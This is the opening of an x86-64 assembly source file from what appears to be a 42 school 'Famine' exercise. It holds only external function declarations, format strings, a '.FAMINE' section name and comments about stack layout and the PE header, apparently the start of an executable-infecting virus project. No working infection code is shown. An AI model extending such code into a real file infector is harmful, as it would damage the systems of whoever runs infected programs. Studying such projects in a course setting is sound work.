; **************************************************************************** ;
;                                                                              ;
;                                                         :::      ::::::::    ;
;    handle_file.asm                                    :+:      :+:    :+:    ;
;                                                     +:+ +:+         +:+      ;
;    By: jcamhi <marvin@42.fr>                      +#+  +:+       +#+         ;
;        magouin                                  +#+#+#+#+#+   +#+            ;
;    Created: 2018/04/01 18:20:28 by jcamhi            #+#    #+#              ;
;    Updated: 2018/04/01 18:20:28 by jcamhi           ###   ########.fr        ;
;                                                                              ;
; **************************************************************************** ;

extrn printf:proc
extern malloc:proc
extern GetFileSize:proc
extrn ReadFile:proc

.code

message_lfanew db 'lfanew = %x',0ah,0
message_word db 'word = %hx', 0ah, 0
SECTION_NAME db '.FAMINE',0

; rbp
; 56 - 64	: padding
; 48 - 56	: nbr of bytes read 
; 40 - 48	: malloc
; 32 - 40	: params
; 00 - 32	: shadow
; rsp

; r12 : handle
; r13 : fileSize
; r14 : emplacement du pe header
; 

